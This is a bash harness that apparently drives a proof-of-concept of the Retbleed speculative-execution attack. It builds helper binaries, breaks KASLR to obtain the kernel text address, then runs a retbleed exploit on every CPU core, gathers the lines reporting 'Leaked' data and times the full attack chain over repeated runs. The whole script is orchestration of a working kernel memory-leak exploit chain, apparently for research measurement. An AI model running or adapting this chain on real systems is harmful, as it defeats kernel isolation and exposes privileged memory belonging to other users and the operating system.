#!/bin/bash
set -e
set -o pipefail
make
make shmemer

OUTDIR=outdir-$(date '+%F__%X')
if [ "$1" == "-m" ]; then
  echo "Massage!"
  OUTDIR=outdir-$(date '+%F__%X')-m
fi

if [ -e $OUTDIR ]; then
  exit 1
fi
mkdir $OUTDIR
echo $OUTDIR

for a in {0..10}; do
  t0=$(date '+%s.%N')

  LOG="$OUTDIR/log_$a.txt"

  mkdir "$OUTDIR/raw_${a}"

  taskset -c `cat /sys/devices/system/cpu/cpu1/topology/thread_siblings_list` ./break_kaslr | tee $LOG
  if [ $? -ne 0 ]; then
    echo mega fail
    exit
  fi
  KTEXT=$(cat $LOG | tail -n1| sed 's/^.*kernel_text @ //')

  while ! ./shmemer $1 -t $[$(nproc)/2] | tee -a "$LOG"; do true; done

  CORES=( $(grep core\ id /proc/cpuinfo | sort | uniq | cut -d: -f2 | bc) )

  for C in ${CORES[@]}; do
    CORE_LOG="$OUTDIR/raw_${a}/${C}.txt"
    (./do_retbleed.sh $KTEXT $C > $CORE_LOG) &
  done

  wait -n || true

  # DONE!?!
  t=$(bc <<< "$(date '+%s.%N') - $t0")
  sleep 5

  kill $(jobs -p) || true ## i dont know why you can fail...
  killall retbleed || true

  for C in ${CORES[@]}; do
    CORE_LOG="$OUTDIR/raw_${a}/${C}.txt"
    if grep -q "Leaked" "$CORE_LOG"; then
      cat $CORE_LOG >> $LOG
    fi
  done
#  rm -f $OUTDIR/log_${a}_*.txt

  echo "FULL CHAIN TIME: ${t}s" | tee -a $LOG

done

